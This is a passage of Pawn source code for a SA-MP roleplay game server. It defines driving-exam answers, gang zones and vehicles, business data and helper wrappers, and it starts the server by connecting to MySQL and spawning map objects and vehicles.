new gExamAnswers[20][4][75] = {
{"50KM/S","60KM/S","90KM/S","120KM/S"}, //1
{"50KM/S","60KM/S","90KM/S","120KM/S"}, //2
{"Roca Ar Mushaobs Shusis Daortqlis Sawinaagmdego Xelsawyo","Benzinis Bakis Yelis Chamketis Dazianebis Shemtxvevashi","Ar Mushaobs Shusis Amwev Damwevi","Arcerti"}, //3
{"Akrdzalulia","Dasashvebia","Dasashvebia Mxolod Moaxloebuli Matareblis Ararsebobis Shemtxvevashi","Dasashvebia, Tu Gadasasvlelamde 150 Metria"}, //4
{"Modzraobis Gagrdzeleba Igive Sichqarit","Manqanis Gachereba","Sichqaris Dakleba 40 KM/S-mde","Nel Nela Davaklot Sichqare Da Gavacherot Manqana Gzis Marjvena Mxares"}, //5
{"Yoveltvis Dasashvebia","Dasashvebia Im Shemtxvevashi Tu Win Mimavali Avtomobili Uxvevs.","Dasashvebia Qalaq Garet","Akrdzalulia"}, //6
{"Dasvrili Shida Shuqis Xelsawyoebi","Dargveulia Farebis Regulireba","Nislis Sawinaagmdego Farebis Ar Qona","Araqarxnuli Shuqis Farebis Xelsawyo"}, //7
{"Mxolod Avariis Tavidan Asacileblad","Imisatvis Rom Gavafrtxilot Rom Vapirebt Gaswrebas","Marto Tu Dainaxet Igive Manqana Rac Tqven Gyavt","Yvela Shemtxvevashi"}, //8
{"Avariis Adgilidan Gaqceva.","Darchena Avariis Adgilze Da Sagzao Policiis Gamodzaxeba","Avariis Adgilze Darchena Da Samashvelo Jgufis Gamodzaxeba","Saswrafos Gamodzaxeba"}, //9
{"`STOP` Nishanis Mere","Gacherebis Adgilze(Parking)","Gzajvaredinze","Fexit Mosiarulis Gadasasvlelze"}, //10
{"Daaklet Sichqare Da Gaiaret Winaagmdegobis Ar Yofnis Shemtxvevashi","Sichqaris Amateba","Gaiaret Ise Rom Sichqare Darches Igive","Avariuli Farebis Chartva"}, //11
{"Avariuli Gacherebis Nishani","Cecxl Chamqrobi","Pirveli Daxmareba Krebuli","Arcerti"}, //12
{"Yovel Gvari Avtomobilis Gadaadgileba","Gadaadgileba Qalaq Garet","Qalaqshi Gadaadgileba","Arcerti"}, //13
{"Qalaqshi","Sacobshi(Propkashi)","Trasaze","Ise Rom Xeli Ar SHevushalot Shemxvedr Transports"}, //14
{"Dasashvebia Marto Trasaze","Dasashvebia Tu Mdzgols Echqareba","Dasashvebia Marto Qalaqshi","Akrdzalulia"}, //15
{"Akrdzalulia","Dasashvebia","Dasashvebia Marto Jipshi","Dasashvebia Mxolod Nishnebi Romelic Ar Gadzlevs Upiratesobas Gzaze"}, //16
{"Marto Manqanebistvis Spec Signalebit","Marto Velosipedistvis","Yoveltvis Dashvebulia","Yoveltvis Akrdzalulia"}, //17
{"Ara, Akrdzalulia","Ki, Dashvebulia","Marto Roca Xedav Policielebis Wevrebs","Marto Roca Marjvena Signali Chartulia"}, //18
{"Mxolod Avtomobilis Gafuchebis Shemtxvevashi","Gaswrebis Dros","Mxolod Avariis Dros","Arcerti Variantia Swori"}, //19
{"Araa Aucilebeli","Aucilebelia","Tu Dzravis Simdzlavre Agemateba 3.0-s","Aucilebelia Fexit Mosiarulis Danaxvis Shemtxvevashi"} //20
};
new gExamTrueAnswer[20] = {2,3,3,2,4,4,3,1,2,2,1,4,1,4,4,1,3,1,4,4};
//Банды
new gGangCars[5][5];
new Float:gGangCarSlot[5][5][4] = {
{ //Ballas
	{2134.7971,-1484.7382,23.5475,0.4335},
	{2134.8293,-1477.4557,23.5409,358.9590},
	{2127.4778,-1492.1014,23.5277,179.4998},
	{2127.3516,-1484.5254,23.5292,180.4980},
	{2127.3301,-1477.1393,23.5301,179.2532}
},
{ //Grove
	{2505.6631,-1694.8070,13.2038,0.0804},
	{2493.5000,-1684.2250,13.0688,273.4389},
	{2485.4285,-1684.4027,13.0601,266.9819},
	{2461.1533,-1664.4733,13.1522,269.8351},
	{2468.4246,-1670.3519,13.0410,188.9372}
},
{ //Aztecas
	{2287.7449,-1889.2540,13.2736,91.7830},
	{2302.6021,-1889.1619,13.3010,88.9345},
	{2314.0730,-1889.2440,13.2970,90.1131},
	{2319.0537,-1898.7491,13.3277,176.7931},
	{2319.2393,-1910.8010,13.3560,178.2617}
},
{ //Vagos
	{2456.4937,-1358.6216,23.6377,358.9385},
	{2445.6440,-1361.0914,23.6312,179.3581},
	{2445.7163,-1351.0835,23.6504,180.2670},
	{2445.5789,-1342.9124,23.6310,178.8987},
	{2445.5957,-1334.3737,23.6470,179.0069}
},
{ //Rifa
	{1663.3348,-2115.2542,13.1949,269.4944},
	{1685.3118,-2118.2502,13.1656,271.3370},
	{1663.3265,-2111.2310,13.1940,270.7160},
	{1680.2125,-2124.8328,13.1947,357.8162},
	{1678.2949,-2106.2539,13.1943,201.0986}
}
};
new gGangAccess[5][4];
new Float:gGangEnter[5][4] = {
	{2148.9377,-1484.8975,26.6240,0.0}, // БАЛЛАС
	{2495.3943,-1691.1404,14.7656,180.0}, // ГРУВ
	{2296.4370,-1882.2383,14.2344,180.0}, // AZTEK
	{2439.5891,-1357.1383,24.1005,270.0}, // VAGOS
	{1673.6681,-2122.4548,14.1460,90.0} // RIFA
};
new gGangDorm[5][4];
new gGangDormLimit[5];
new gGangCode[5];
new Text3D:gGangDormText[5];
//Настройки для банд
new gGunAmount[8] = {20,50,80,110,140,170,200,230}; //SD,Deagle,MP5,Shotgun,M4,AK47,Rifle,Sniper Rifle
new gGunID[8] = {23,24,29,25,30,33,31,34};
new gGangCarModelID[15] = {412,419,422,474,475,482,491,492,517,534,536,566,567,575,576};
new gGangCarColors[5] = {242,86,2,6,53};

new ZoneOnBattle[135];
new GZSafeTime[135];
new CaptFight;
new PlayerText:CaptureTime[MAX_PLAYERS];
enum GzoneInfo
{
	gID,
    Float:gCoords[4],
    Float:gPos[3],
	gFrakVlad,
	gNapad,
}
new GZInfo[135][GzoneInfo];
new FrakCD[20];
new CountOnZone[40];
new captures = 0;
new allowedfactions[] = { 3, 4, 5, 6, 7};
new Text:Dallee[4];

//Армии
new gArmyWarehouse[2][2];
new Text3D:gArmyWarehouseText[2];

//PD
#define PD_DOOR_COUNT 6
#define PD_DOOR_SPEED 0.8
#define PD_DOOR_DELAY 5000
new gPDWarehouse[3][2],Kazna,OffFrac;
new Text3D:gPDWarehouseText[3];
new gEmCall[3];
//Новости
new gAdvert[MAX_ADVERT_COUNT][ADVERT_DATA];
new gAdvertCount;
new gAdvertPrice = 8;
new gNewsDialing = false;
new gNewsDialer = INVALID_PLAYER_ID;
new gNewsDialee = INVALID_PLAYER_ID;
new gNewsDialPrice = 0;
new gNewsDialMoney = 0;
new gNewsMoney = 0;

//Бизнесы
new gBints[BINT_COUNT][BINT_DATA];
new gBintEnterArea[BINT_COUNT];
new gBintBuyArea[BINT_COUNT];
new gBusiness[MAX_BUSINESS_COUNT][BUSINESS_DATA];
new gBusinessArea[MAX_BUSINESS_COUNT];
new Text3D: gBusinessText[MAX_BUSINESS_COUNT];
new gBusinessIcon[MAX_BUSINESS_COUNT];
new gBusinessTypeName[BUSINESS_TYPE_COUNT][24] = {"Прод. магазин","Закусочная","24/7","Бар","Клуб","Спортзал","Магазин одежды","Автомастерская"};
new gBusinessCount;
new gShopProduct[SHOP_OBJECTS] = {60,50,40,30,20,10,30};
new gShopObject[SHOP_OBJECTS][24] = {"1. Telefoni","2. Beisbolos Bita","3. Saati","4. Yvavilebi","5. Kamera","6. Cecxl Maqri","7. Маска"};

//Ремонт
enum REPAIR_OBJECTS
{
	repairColor
}
//new gRepairProduct[REPAIR_OBJECTS] = {250};
enum STATS_INFO
{
	Text:SkinPlayer,
	Text:SkinUpdate,
	Text:SkinWeapon,
	Text:SkinEatText,
	Text:SkinText2,
	Text:SkinText3[8],
	Text:SkinExit,
	Text:s1SkinPlayer,
	Text:SkinPlayer1,
	Text:SkinPlayer2,
	Text:SkinPlayer3,
	Text:SkinPlayer4,
	Text:SkinPlayer5,
	Text:SkinPlayer6,
	Text:SkinPlayer7,
	Text:SkinPlayer8,
	Text:SkinPlayer9,
	Text:SkinPlayer10,
	Text:SkinPlayer11,
	Text:SkinPlayer12,
	Text:SkinPlayer13
}
new Statistic[STATS_INFO];
new Text:TextdrawStats;
new Text:TextdrawMCAPT;
enum COMP_ELEMENTS
{
	Text:C_ELEMENT_BACKGROUND,
	Text:C_ELEMENT_WANTED_PHOTO3
}
new gInterfaceElement[COMP_ELEMENTS];

static const MaxPassengers[27] =
{
    0x10331113, 0x11311131, 0x11331313, 0x80133301,
    0x1381F110, 0x10311103, 0x10001F10, 0x11113311,
    0x13113311, 0x31101100, 0x30001301, 0x11031311,
    0x11111331, 0x10013111, 0x01131100, 0x11111110,
    0x11100031, 0x11130221, 0x33113311, 0x11111101,
    0x33101133, 0x101001F0, 0x03133111, 0xFF11113F,
    0x13330111, 0xFF131111, 0x0000FF3F
}; // HEX смещения макс. кол-ва пассажиров на основной транспорт

main()
{
	//print("gamemode loaded");
}

stock Float:PointToPoint2D(Float:x1,Float:y1,Float:x2,Float:y2) return floatsqroot(floatadd(floatpower(x2-x1,2),floatpower(y2-y1,2)));
stock Float:PointToPoint3D(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2) return floatsqroot(floatadd(floatadd(floatpower(x2-x1,2),floatpower(y2-y1,2)),floatpower(z2-z1,2)));
stock Float:GetPlayerDistanceToPlayer(playerid, targetid)
{
    new Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2;
    GetPlayerPos(playerid, x, y, z);
    GetPlayerPos(targetid, x2, y2, z2);
    return PointToPoint2D(x, y, x2, y2);
}

stock CreateVehicleEx(modelid, Float: X, Float: Y, Float: Z, Float: A, Color1, Color2, SpawnDelay)
{
	new id = CreateVehicle(modelid, X, Y, Z, A, Color1, Color2, SpawnDelay);
	gVehicles[id - 1][vX] = X;
	gVehicles[id - 1][vY] = Y;
	gVehicles[id - 1][vZ] = Z;
	gVehicles[id - 1][vA] = A;
	for(new Vehicles = 0; Vehicles < MAX_VEHICLES; Vehicles++)
 	{
 		SetVehicleNumberPlate(Vehicles, "GARP");
  	}
	return id;
}

stock AddStaticVehicleExEx(modelid, Float: X, Float: Y, Float: Z, Float: A, Color1, Color2, SpawnDelay)
{
	new id = AddStaticVehicleEx(modelid, X, Y, Z, A, Color1, Color2, SpawnDelay);
	gVehicles[id - 1][vX] = X;
	gVehicles[id - 1][vY] = Y;
	gVehicles[id - 1][vZ] = Z;
	gVehicles[id - 1][vA] = A;
	return id;
}

stock AddStaticVehicleExx(modelid, Float: X, Float: Y, Float: Z, Float: A, Color1, Color2)
{
	new id = AddStaticVehicle(modelid, X, Y, Z, A, Color1, Color2);
	gVehicles[id - 1][vX] = X;
	gVehicles[id - 1][vY] = Y;
	gVehicles[id - 1][vZ] = Z;
	gVehicles[id - 1][vA] = A;
	return id;
}

stock SetVehiclePosEx(vehicleid, Float: X, Float: Y, Float: Z) {
	gVehicles[vehicleid - 1][vX] = X;
	gVehicles[vehicleid - 1][vY] = Y;
	gVehicles[vehicleid - 1][vZ] = Z;
	SetVehiclePos(vehicleid, X, Y, Z);
	return true;
}
stock AnRepairVehicle(vehicleid)
{
	for(new i=0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(GetPlayerVehicleID(i) == vehicleid && GetPlayerState(i) == PLAYER_STATE_DRIVER)
	        {
	            player_NoCheckTimeVeh[i] = 3;
			}
		}
	}
	RepairVehicle(vehicleid);
 	return true;
}
stock SetVehicleZAngleEx(vehicleid, Float: Angle) {
	gVehicles[vehicleid - 1][vA] = Angle;
	SetVehicleZAngle(vehicleid, Angle);
	return true;
}

stock RemovePlayerFromVehicleEx(playerid)
{
 	//SetTimerEx("ProverkaTS",2000,false,"i",playerid);
	return RemovePlayerFromVehicle(playerid);
}

/*forward ProverkaTS(playerid);
public ProverkaTS(playerid)
{
    if(IsPlayerInAnyVehicle(playerid)) Kick(playerid);
	return true;
}*/

stock ResetCarInfo(playerid)
{
    IDVEH[playerid] = -1;
    UseEnter[playerid] = false;
}

stock PutPlayerInVehicleEx(playerid,vehicleid,seatid)
{
    UseEnter[playerid] = true;
    IDVEH[playerid] = vehicleid;
	PutPlayerInVehicle(playerid,vehicleid,seatid);
}

stock TogglePlayerControllableEx(playerid,toggle)
{
	TogglePlayerControllable(playerid,toggle);
}

stock SetPlayerVirtualWorldEx(playerid,worldid)
{
	SetPlayerVirtualWorld(playerid,worldid);
}

stock SetVehicleParamsExEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective)
{
	if(engine == 1) gVehicles[vehicleid-1][vEngine] = true;
	else gVehicles[vehicleid-1][vEngine] = false;
	SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
}

stock SetPlayerSkinEx(playerid,skinid)
{
	SetPlayerSkin(playerid,skinid);
}

stock SetPlayerPosEx(playerid,Float:x,Float:y,Float:z, control = 1)
{
    SetPVarInt(playerid,"TPFPPP",gettime()+3);
	if(control) TogglePlayerControllableEx(playerid,1);
	pTemp[playerid][pX2] = x;
	return SetPlayerPos(playerid,x,y,z);
}

stock ResetPlayerWeaponsEx(playerid)
{
    ResetPlayerWeapons(playerid);
	for(new i;i<13;i++)
	{
		gGuns[playerid][i] = 0;
		gAmmos[playerid][i] = 0;
	}
}

stock ShowPlayerDialogEx(playerid,dialogid,style,caption[],info[],button1[],button2[])
{
    if(GetPVarInt(playerid, "DialogID") != -2) return true;
    if(dialogid == -1) SetPVarInt(playerid, "DialogID", -2);
    SetPVarInt(playerid, "DialogID", dialogid);
	return ShowPlayerDialog(playerid,dialogid,style,caption,info,button1,button2);
}

stock ChangeVehicleColorEx(vehicleid,color1,color2)
{
	gVehicles[vehicleid-1][vColor][0] = color1+1;
	gVehicles[vehicleid-1][vColor][1] = color2+1;
	ChangeVehicleColor(vehicleid,color1,color2);
}

stock PlayerTextDrawDestroyEx(playerid,PlayerText:textdrawf)
{
	PlayerTextDrawDestroy(playerid,textdrawf);
	textdrawf = PlayerText:INVALID_TEXT_DRAW;
}

#define CreateVehicle CreateVehicleEx
#define AddStaticVehicleEx AddStaticVehicleExEx
#define AddStaticVehicle AddStaticVehicleExx
#define SetVehiclePos SetVehiclePosEx
#define SetVehicleZAngle SetVehicleZAngleEx
#define RemovePlayerFromVehicle RemovePlayerFromVehicleEx
#define PutPlayerInVehicle PutPlayerInVehicleEx
#define TogglePlayerControllable TogglePlayerControllableEx
#define SetPlayerVirtualWorld SetPlayerVirtualWorldEx
#define SetVehicleParamsEx SetVehicleParamsExEx
#define SetPlayerSkin SetPlayerSkinEx
#define SetPlayerPos SetPlayerPosEx
#define ResetPlayerWeapons ResetPlayerWeaponsEx
#define ShowPlayerDialog ShowPlayerDialogEx
#define ChangeVehicleColor ChangeVehicleColorEx
#define PlayerTextDrawDestroy PlayerTextDrawDestroyEx

stock DestroyDynamic3DTextLabelEx(&Text3D:text)
{
	DestroyDynamic3DTextLabel(text);
	text = Text3D:INVALID_3DTEXT_ID;
}

stock IsValid3DTextLabel(Text3D:textid)
{
	if(textid != Text3D:INVALID_3DTEXT_ID) return true;
	else return false;
}
public OnGameModeInit()
{
    AntiDeAMX();
    players = cvector();
	gCurDay = GetDayNumber();
	printf("Current day: %d",gCurDay);
	new str[128];
	print("\n\nПодключение к MySQL серверу\n");
	//mysql_log(LOG_ERROR | LOG_WARNING | LOG_DEBUG, LOG_TYPE_HTML);
	mysql = mysql_connect(MYSQLHOST, MYSQLUSER, MYSQLDABE, MYSQLPASS);
	mysql_stat(str, mysql, sizeof str);
	if(!strcmp(str, "MySQL server has gone away", true, 26))
	{
		print("Подключиться неудалось, проверьте данные подключения:");
		print("\thostname: "MYSQLHOST":3306");
		print("\tdb_name : "MYSQLDABE);
		print("\tusername: "MYSQLUSER);
		print("\tpassword: "MYSQLPASS"\n");
		GameModeExit();
		print("Перезагрузка...\n\n");
	}
	else printf("Успешное подключение.\nБаза данных:\t"MYSQLDABE" (id: %d)\n", mysql);
	new mi,h,addob;
	gettime(h,mi,gCurHour);
	SetWorldTime(h);
	SetGravity(0.009);
	DisableInteriorEnterExits();
	EnableStuntBonusForAll(0);
	ManualVehicleEngineAndLights();
	LimitGlobalChatRadius(13.0);
	LimitPlayerMarkerRadius(12.0);
    reporti = 1;
	SendRconCommand("rcon 0");
	SetGameModeText("°•.[DS:RL].•°");
	mysql_empty(mysql, "SET CHARACTER SET cp1251");

	specmenu = CreateMenu("Recon", 1, 15.0, 200.0, 100.0);
    AddMenuItem(specmenu,0,"Refresh");
    AddMenuItem(specmenu,0,"Slap");
    AddMenuItem(specmenu,0,"Info");
    AddMenuItem(specmenu,0,"Weapon");
    AddMenuItem(specmenu,0,"Check GM");
    AddMenuItem(specmenu,0,"-EXIT-");

	//Остальные обнуления
	for(new i;i<MAX_VEHICLES;i++)
	{
		gVehicleDriver[i] = INVALID_PLAYER_ID;
		gVehicles[i][vID] = INVALID_VEHICLE_ID;
		gVehicles[i][vvID] = INVALID_VEHICLE_ID;
	}

	CreateTextDRAWS();
	AddPlayerClass(36,0.0,0.0,5.0,0.0,0,0,0,0,0,0);
	// Sabajos Mapi
	CreateDynamicObject(3578, 51.66110, -1539.15942, 4.76360,   0.00000, 0.00000, 83.31800);
	CreateDynamicObject(3578, 52.25870, -1534.07275, 4.76360,   0.00000, 0.00000, 83.31800);
	CreateDynamicObject(3578, 51.49050, -1539.86865, 6.32090,   0.00000, 0.00000, 83.31800);
	CreateDynamicObject(3578, 52.19340, -1534.04504, 6.30420,   0.00000, 0.00000, 83.31800);
	CreateDynamicObject(3578, 79.53540, -1519.58691, 4.24180,   0.00000, 0.00000, 17.00380);
	CreateDynamicObject(3578, 603.08588, -1203.52954, 17.83020,   0.00000, 0.00000, 20.47660);
	CreateDynamicObject(3578, 602.91168, -1203.10315, 19.26660,   0.00000, 0.00000, 20.47660);
	CreateDynamicObject(3578, 620.48547, -1196.69189, 19.35850,   0.00000, 0.00000, 20.72230);
	CreateDynamicObject(3578, 620.50128, -1196.86987, 17.83020,   0.00000, 0.00000, 20.72230);
	CreateDynamicObject(3578, 624.52972, -1195.22815, 19.35850,   0.00000, 0.00000, 23.08920);
	CreateDynamicObject(3578, 624.61292, -1195.38586, 17.83020,   0.00000, 0.00000, 24.33560);
	CreateDynamicObject(3578, 639.87878, -1187.09387, 19.35030,   0.00000, 0.00000, 30.13130);
	CreateDynamicObject(3578, 640.08252, -1187.49756, 17.83020,   0.00000, 0.00000, 28.10720);
	CreateDynamicObject(19912, 1660.01306, -60.71660, 37.93820,   0.00000, 0.00000, 15.76260);
	CreateDynamicObject(19912, 1655.79529, -61.76400, 37.98050,   0.00000, 0.00000, 15.76260);
	CreateDynamicObject(3578, 1672.51965, -56.71070, 35.92170,   0.00000, 0.00000, 17.74340);
	CreateDynamicObject(3578, 1672.42151, -56.43000, 37.34080,   0.00000, 0.00000, 17.74340);
	// Sabajo
	sabajo = CreateDynamicObject(969, 52.62290, -1528.91260, 4.28000,   0.00000, 0.00000, 82.24400);
	sabajo2 = CreateDynamicObject(969, 615.95892, -1198.96472, 17.45850,   0.00000, 0.00000, 200.04015);
	sabajo3 = CreateDynamicObject(969, 628.09796, -1193.59338, 17.45850,   0.00000, 0.00000, 24.78000);
	sabajo4 = CreateDynamicObject(969, 1668.23169, -58.33839, 35.34820,   0.00000, 0.00000, 198.23999);
	CreateDynamic3DTextLabel("{ff8000}Sheiyvanet\n{FFFFFF}/sabajo\n{ff8000}Rom Gadakvetot Sazgvari",CGREEN,53.1265,-1524.2258,8.7875,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{ff8000}Sheiyvanet\n{FFFFFF}/sabajo\n{ff8000}Rom Gadakvetot Sazgvari",CGREEN,611.4338,-1200.4614,21.6464,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{ff8000}Sheiyvanet\n{FFFFFF}/sabajo\n{ff8000}Rom Gadakvetot Sazgvari",CGREEN,631.8889,-1191.8337,21.6464,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{ff8000}Sheiyvanet\n{FFFFFF}/sabajo\n{ff8000}Rom Gadakvetot Sazgvari",CGREEN,1665.0804,-59.4151,39.2027,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{ff8000}Commands:\n{FFFFFF}/sellgun\n/giveammo\n/givedrugs\n",CGREEN,-369.9488,-1422.4059,25.6519,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	//Авто (НЕ В КОЕМ СЛУЧАЕ НЕ СОЗДАВАТЬ АВТО ВНАЧАЛЕ / ВСЕРЕДИНЕ)
	aTaxi[0] = AddStaticVehicleEx(420,1279.4307,-1832.5129,13.1630,89.0221,6,6,900); // taxi
	AddStaticVehicleEx(420,1278.9377,-1795.4553,13.0068,87.4217,6,6,900); // taxi
	AddStaticVehicleEx(420,1279.4341,-1799.2744,12.9921,82.6579,6,6,900); // taxi
	AddStaticVehicleEx(420,1278.8439,-1804.9135,12.9918,93.6691,6,6,900); // taxi
	AddStaticVehicleEx(420,1279.3879,-1811.8484,12.9946,89.6135,6,6,900); // taxi
	AddStaticVehicleEx(420,1260.7161,-1794.9956,13.0305,184.5284,6,6,900); // taxi
	AddStaticVehicleEx(420,1266.3860,-1795.4166,13.0197,180.5436,6,6,900); // taxi
	AddStaticVehicleEx(420,1271.0792,-1795.6670,13.0121,179.0659,6,6,900); // taxi
	AddStaticVehicleEx(420,1198.5874,-1827.7423,13.0175,273.0919,6,6,900); // taxi
	AddStaticVehicleEx(420,1197.9106,-1831.5488,13.0051,273.0247,6,6,900); // taxi
	AddStaticVehicleEx(420,1197.5557,-1835.4008,13.0098,270.8376,6,6,900); // taxi
	AddStaticVehicleEx(438,-1976.9308,171.0926,27.6965,90.8432,6,76,900); // taxi
	AddStaticVehicleEx(438,-1977.0186,173.8885,27.6929,91.4295,6,76,900); // taxi
	AddStaticVehicleEx(438,-1976.9823,176.5466,27.6897,90.1423,6,76,900); // taxi
	AddStaticVehicleEx(438,-1977.0211,179.0512,27.6925,91.7943,6,76,900); // taxi
	AddStaticVehicleEx(438,-1977.1218,181.8764,27.6899,91.1119,6,76,900); // taxi
	AddStaticVehicleEx(438,-1977.3246,184.7602,27.6906,91.1435,6,76,900); // taxi
	AddStaticVehicleEx(438,-1977.4196,187.3457,27.6921,91.3429,6,76,900); // taxi
	AddStaticVehicleEx(438,-1977.4862,189.8986,27.6908,90.5097,6,76,900); // taxi
	AddStaticVehicleEx(438,-1977.3994,192.5732,27.6801,88.1553,6,76,900); // taxi
	AddStaticVehicleEx(438,2853.2122,1344.5088,10.7878,89.6124,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2852.9778,1351.6396,10.7885,89.7346,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2852.8220,1358.2740,10.7848,90.8794,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2852.7888,1364.4900,10.7874,90.5158,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2839.2864,1374.5321,10.7410,180.3761,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2845.8245,1374.4125,10.7726,180.1833,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2813.5295,1374.1868,10.7287,180.3512,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2805.5476,1367.7980,10.7300,271.4727,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2805.2358,1361.3254,10.7461,270.0573,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2805.5393,1354.8939,10.7287,270.3571,6,6,900); // ????? ??
	AddStaticVehicleEx(438,2805.5674,1348.5839,10.7285,271.4355,6,6,900); // ????? ??
	aTaxi[1] = AddStaticVehicleEx(420,1279.4696,-1823.6371,13.1650,89.4813,6,6,900); // taxi
	aMech[0] = AddStaticVehicleEx(525,1629.9731,-1107.3790,23.7770,269.0417,1,1,900); // mech1
	AddStaticVehicleEx(525,1629.4841,-1103.1021,23.7909,269.0558,1,1,900); // mech
	AddStaticVehicleEx(525,1629.2927,-1098.5747,23.7868,267.8041,1,1,900); // mech
	AddStaticVehicleEx(525,1629.7563,-1094.1249,23.7804,270.0126,1,1,900); // mech
	AddStaticVehicleEx(525,1629.6484,-1089.6924,23.7825,268.6381,1,1,900); // mech
	AddStaticVehicleEx(525,1629.6514,-1085.4105,23.7888,269.7866,1,1,900); // mech
	AddStaticVehicleEx(525,1650.0527,-1080.3723,23.7779,90.1558,1,1,900); // mech
	AddStaticVehicleEx(525,1649.8688,-1084.6675,23.7874,89.6070,1,1,900); // mech
	AddStaticVehicleEx(525,1649.8636,-1089.0616,23.7756,89.4469,1,1,900); // mech
	AddStaticVehicleEx(525,1649.8226,-1093.4200,23.7847,89.4492,1,1,900); // mech
	AddStaticVehicleEx(525,1649.7798,-1097.9421,23.7892,89.4507,1,1,900); // mech
	AddStaticVehicleEx(525,1649.7368,-1102.4625,23.7936,89.4489,1,1,900); // mech
	AddStaticVehicleEx(525,1649.6962,-1106.7177,23.7977,89.4471,1,1,900); // mech
	AddStaticVehicleEx(525,1649.6538,-1111.1470,23.8028,89.4456,1,1,900); // mech
	AddStaticVehicleEx(525,1657.5012,-1111.4420,23.7869,269.4698,1,1,900); // mech
	AddStaticVehicleEx(525,1657.5392,-1107.2997,23.7973,269.4655,1,1,900); // mech
	AddStaticVehicleEx(525,1657.5796,-1102.9006,23.8014,269.4637,1,1,900); // mech
	AddStaticVehicleEx(525,1657.6230,-1098.2303,23.8014,269.4638,1,1,900); // mech
	AddStaticVehicleEx(525,1657.6656,-1093.6613,23.8055,269.4624,1,1,900); // mech
	AddStaticVehicleEx(525,1657.7426,-1089.2646,23.8144,269.2196,1,1,900); // mech
	AddStaticVehicleEx(525,1657.8044,-1084.7079,23.8144,269.2196,1,1,900); // mech
	aMech[1] = AddStaticVehicleEx(525,1657.8617,-1080.4961,23.8141,269.2154,1,1,900); // mech

	//Инструкторские
	aInstructor[0] = AddStaticVehicleEx(487,599.9196,-1472.0789,83.9534,269.7997,1,1,900); // start
	AddStaticVehicleEx(426,588.1486,-1520.8337,14.9773,267.8480,2,2,900); //
	AddStaticVehicleEx(467,587.9868,-1516.6096,14.9989,266.8946,3,3,900); //
	AddStaticVehicleEx(466,588.2853,-1511.1194,15.0154,268.5906,1,1,900); //
	AddStaticVehicleEx(492,588.5453,-1507.0681,15.0721,266.9110,7,7,900); //
	AddStaticVehicleEx(492,588.8928,-1501.7953,15.0865,266.5788,13,13,900); //
	AddStaticVehicleEx(507,589.4847,-1497.2440,14.9211,254.3350,45,45,900); //
	AddStaticVehicleEx(516,610.1833,-1520.7173,14.8998,89.8980,19,19,900); //
	AddStaticVehicleEx(540,610.2759,-1516.6234,14.8142,89.5984,8,8,900); //
	AddStaticVehicleEx(579,614.0118,-1485.2968,14.6306,179.7439,9,9,900); //
	aInstructor[1] = AddStaticVehicleEx(566,610.2338,-1512.2427,14.7007,90.7162,1,1,900); //
	//ТАЧКИ ОТЕЛЕЙ
	aHotel[0][0] = AddStaticVehicleEx(491,306.7053,-1481.9114,24.3321,235.1040,2,2,100); // ?? ???
	AddStaticVehicleEx(491,303.8865,-1486.3356,24.3320,233.9853,2,2,100); // ?? ???
	AddStaticVehicleEx(491,300.4633,-1490.8159,24.3320,234.8512,2,2,100); // ?? ???
	AddStaticVehicleEx(491,304.3915,-1499.9922,24.3389,235.8674,2,2,100); // ?? ???
	AddStaticVehicleEx(491,301.2484,-1504.8590,24.3367,233.0188,2,2,100); // ?? ???
	AddStaticVehicleEx(491,297.2050,-1508.6417,24.3320,234.7628,2,2,100); // ?? ???
	AddStaticVehicleEx(491,295.1679,-1513.8004,24.3320,233.7870,2,2,100); // ?? ???
	AddStaticVehicleEx(491,291.8572,-1518.0112,24.3320,233.0329,2,2,100); // ?? ???
	AddStaticVehicleEx(491,288.6617,-1522.5038,24.3320,235.3225,2,2,100); // ?? ???
	AddStaticVehicleEx(491,285.2116,-1526.6665,24.3320,234.5272,2,2,100); // ?? ???
	AddStaticVehicleEx(491,282.1878,-1531.6106,24.3320,234.7774,2,2,100); // ?? ???
	AddStaticVehicleEx(491,278.0609,-1535.7410,24.3328,234.7070,2,2,100); // ?? ???
	AddStaticVehicleEx(491,297.9552,-1536.3416,24.3320,54.2016,2,2,100); // ?? ???
	AddStaticVehicleEx(491,294.9721,-1540.6583,24.3321,53.4352,2,2,100); // ?? ???
	aHotel[0][1] = AddStaticVehicleEx(491,291.6126,-1544.9066,24.3320,54.3312,2,2,100); // ?? ???
	aHotel[1][0] = AddStaticVehicleEx(491,-2437.2063,93.6160,34.9101,358.1819,3,3,100); // CA ???
	AddStaticVehicleEx(491,-2443.0583,93.8862,34.9101,0.3003,3,3,100); // C? ???
	AddStaticVehicleEx(491,-2450.9031,93.6493,34.9101,1.0840,3,3,100); // C? ???
	AddStaticVehicleEx(491,-2460.6736,93.4256,34.9102,358.4257,3,3,100); // C? ???
	AddStaticVehicleEx(491,-2469.4438,93.5868,34.9100,1.4050,3,3,100); // C? ???
	AddStaticVehicleEx(491,-2476.1782,94.0847,34.9132,359.7757,3,3,100); // C? ???
	AddStaticVehicleEx(491,-2481.8738,93.4419,34.9101,359.9640,3,3,100); // C? ???
	AddStaticVehicleEx(491,-2491.5735,93.9680,34.9101,358.9107,3,3,100); // C? ???
	aHotel[1][1] = AddStaticVehicleEx(491,-2499.7336,93.2767,34.9101,0.6007,3,3,100); // C? ???
